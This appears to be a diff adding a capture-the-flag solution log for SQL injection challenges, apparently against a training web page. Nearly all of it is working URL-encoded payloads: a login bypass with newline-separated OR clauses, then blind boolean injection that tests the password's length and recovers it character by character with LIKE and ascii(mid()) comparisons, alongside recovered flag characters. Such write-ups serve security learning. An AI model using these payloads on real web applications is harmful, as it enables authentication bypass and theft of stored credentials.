@@ -1,0 +1,30 @@
+sqli 1 
+https://me.zongyuan.nctu.me/sqlinject/sql.php?password=%27%0aor%0a(id%0aLIKE%0a%27admin%27)%0a%23
+balqs{OH_NO_you_hack_me}
+
+sqli 2
+https://me.zongyuan.nctu.me/sqlinject/sql.php?password='%0aor%0a(id%0aLIKE%0a'admin'%0a%26%26%0alength(password)%0aLIKE%0a17)%0a--'
+password length = 17
+https://me.zongyuan.nctu.me/sqlinject/sql.php?password='%0aor%0a(id%0aLIKE%0a'admin'%0a%26%26%0apassword%0aLIKE%0a'b%')%0a--'
+b
+https://me.zongyuan.nctu.me/sqlinject/sql.php?password='%0aor%0a(id%0aLIKE%0a'admin'%0a%26%26%0apassword%0aLIKE%0a'ba%')%0a--'
+a
+l
+q
+s
+{
+i
+_
+password=%27%0aor%0a(id%0aLIKE%0a%27admin%27%0a%26%26%0aascii(mid(password,8,1))<%0aascii('b'))%0a--%27   true
+password=%27%0aor%0a(id%0aLIKE%0a%27admin%27%0a%26%26%0aascii(mid(password,8,1))<%0aascii('a'))%0a--%27   false
+a
+m
+_
+b
+i
+n
+d
+?
+}
+
+sqli3
